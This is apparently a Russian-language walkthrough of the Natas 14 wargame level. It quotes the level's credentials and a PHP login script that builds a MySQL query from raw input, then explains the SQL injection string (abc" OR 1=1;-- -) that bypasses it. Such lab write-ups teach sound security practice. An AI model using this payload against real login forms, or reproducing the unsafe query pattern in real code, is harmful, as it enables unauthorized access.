Natas14

Login:natas14
Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

1)На главной странице есть форма авторизации, необходимо ввести логин и пароль для входа. Есть возможность просмотреть исходный код(View sourcecode)
![изображение](https://user-images.githubusercontent.com/54982244/174027965-1019b729-b4b3-4120-9cb6-b1112bc9b76d.png)
2) В исходном коде видно что идет подключение к БД mysql, формируется запрос к БД, при этом нет никакой фильтрации, значит можно провети sql инъекцию для
обхода авторизации.

        <?
        if(array_key_exists("username", $_REQUEST)) {
            $link = mysql_connect('localhost', 'natas14', '<censored>');
            mysql_select_db('natas14', $link);

            $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
            if(array_key_exists("debug", $_GET)) {
                echo "Executing query: $query<br>";
            }

            if(mysql_num_rows(mysql_query($query, $link)) > 0) {
                    echo "Successful login! The password for natas15 is <censored><br>";
            } else {
                    echo "Access denied!<br>";
            }
            mysql_close($link);
        } else {
        ?>

3) Для обхода авторизации в поле login введем такие строки - abc" OR 1=1;-- - 
![изображение](https://user-images.githubusercontent.com/54982244/174030812-e793ce20-c1b2-4d42-9968-da8a181b02be.png)
4) По итогу запрос превратится во что то вроде этого

        SELECT * from users where username="abc" OR 1=1;-- - and password="password";
 
Все что находится после -- - не имеет значения. Остаенется SELECT * from users where username="abc" OR 1=1; В таком случае,если 
одно из условий OR возвращает истину, все выражение возвращает истину. 1=1 в любом случае вернет истину.
Следовательно, мы можем заставить сервер возвращать true в where ,что приведет к тому, что приложение вернет все строки в таблице.
![изображение](https://user-images.githubusercontent.com/54982244/174032203-4dfeca95-d87e-4587-b882-fa294a8e0dc5.png)

